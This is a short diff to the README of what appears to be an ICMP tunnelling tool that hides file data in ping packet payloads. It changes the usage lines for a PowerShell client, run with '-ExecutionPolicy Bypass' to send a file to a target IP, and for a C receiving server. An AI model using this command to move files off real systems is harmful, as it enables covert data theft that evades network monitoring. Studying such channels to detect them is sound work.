@@ -15,7 +15,7 @@ Data is injected in the payload part of the ICMP echo packet (see the [Ping RFC 
 
 Usage:
 ```
-powershell.exe -ExecutionPolicy Bypass -File ping-client.ps1 /path/to/your/file
+powershell.exe -ExecutionPolicy Bypass -File ping-client.ps1 yourtargetip /path/to/your/file
 ```
 
 #### C Posix server:
@@ -24,7 +24,7 @@ powershell.exe -ExecutionPolicy Bypass -File ping-client.ps1 /path/to/your/file
 Usage:
 ```
 gcc pingserver.c -o pingserver
-./pingserver client-ip payloadsize
+./pingserver
 ```
 
 
